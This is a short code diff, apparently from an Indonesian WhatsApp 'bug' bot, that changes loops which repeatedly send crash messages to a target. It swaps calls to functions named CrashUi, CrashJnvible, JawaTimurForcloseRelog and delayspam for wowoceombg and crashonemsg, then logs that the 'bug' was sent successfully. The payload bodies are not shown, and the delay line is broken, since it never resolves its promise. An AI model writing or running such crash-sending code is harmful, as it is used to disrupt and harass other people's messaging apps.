@@ -1125,10 +1125,8 @@ if (remainingTime > 0) {
     }
 
     // Eksekusi bug setelah progres selesai
-    for (let i = 0; i <= 50; i++) {   
-   await JawaTimurForcloseRelog(sock, target);
-   await CrashUi(sock, target);
-   await CrashJnvible(sock, target);
+    for (let i = 0; i <= 5; i++) {   
+   await wowoceombg(sock, target);
    const delay = ms => new Promise(res => setTimeout(1500));
 }
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
@@ -1227,8 +1225,8 @@ if (remainingTime > 0) {
     }
 
     // Eksekusi bug setelah progres selesai
-    for (let i = 0; i <= 50; i++) {   
-    await delayspam(sock, target);
+    for (let i = 0; i <= 2; i++) {   
+    await crashonemsg(sock, target);
    const delay = ms => new Promise(res => setTimeout(1500));
 }
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
